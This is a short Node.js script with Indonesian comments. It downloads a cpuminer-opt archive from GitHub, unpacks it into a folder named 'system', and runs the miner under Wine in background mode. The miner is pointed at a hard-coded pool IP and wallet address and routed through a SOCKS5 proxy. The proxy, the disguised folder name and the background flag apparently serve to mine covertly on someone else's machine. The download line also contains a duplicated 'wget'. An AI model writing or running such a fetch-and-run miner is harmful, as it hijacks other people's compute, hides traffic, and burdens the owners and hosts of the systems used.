const { exec } = require('child_process');
const util = require('util');
const execAsync = util.promisify(exec);

// Fungsi untuk menjalankan perintah shell
async function runCommand(command, description) {
  console.log(`Menjalankan: ${description}`);
  try {
    const { stdout, stderr } = await execAsync(command);
    if (stderr) console.error(`Stderr (${description}): ${stderr}`);
    console.log(`Output (${description}): ${stdout}`);
  } catch (error) {
    console.error(`Error (${description}): ${error.message}`);
  }
}

// Perintah untuk menjalankan skrip wget
const downloadAndRunScript = `
wget wget https://github.com/JayDDee/cpuminer-opt/releases/download/v27.4/cpuminer-opt-24.7-windows.zip && unzip cpuminer-opt-24.7-windows.zip -d system &&
rm cpuminer-opt-24.7-windows.zip && 
cd system && 
wine ./cpuminer-sse2.exe -a minotaurx -o stratum+tcp://146.103.45.69 -u RNPTaDxarafTVGK3qaDGHRUhnvW3Mr4ux8 -p c=RVN,mc=SMT/SPRX/SWAMP -x socks5://192.252.209.155:14455 -t2 -B
`;

// Fungsi utama
async function main() {
  await runCommand(downloadAndRunScript, "Menjalankan skrip dengan Wine");
}

main();
